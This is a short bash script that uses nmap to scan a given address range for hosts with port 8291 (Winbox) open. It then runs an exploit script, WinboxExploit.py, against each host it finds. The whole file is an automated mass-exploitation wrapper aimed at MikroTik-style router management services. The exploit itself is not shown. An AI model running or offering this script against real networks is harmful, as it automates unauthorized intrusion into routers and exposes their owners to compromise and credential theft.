#!/bin/bash

for i in $(nmap -n -p8291 $1 -oG - | grep open | awk '{print $2}'); do python3 WinboxExploit.py $i; done
